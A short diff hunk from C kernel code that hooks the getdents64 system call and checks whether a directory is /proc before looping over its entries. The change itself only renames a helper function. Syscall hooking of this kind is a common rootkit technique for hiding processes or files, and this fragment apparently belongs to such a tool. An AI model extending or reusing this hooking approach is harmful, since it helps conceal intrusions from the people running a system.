@@ -82,7 +82,7 @@ SYSCALL_HOOK_HANDLER3(getdents64, orig_getdents64, p_regs, unsigned int, ui32_fd
     l_ret       = l_ret_orig;
 
     // Check if the directory is /proc/
-    b_is_proc_root = is_proc_root(p_file);
+    b_is_proc_root = is_file_proc_root(p_file);
 
     // Loop over the directory entries until the end of the buffer is reached
     // or the current directory entry is empty
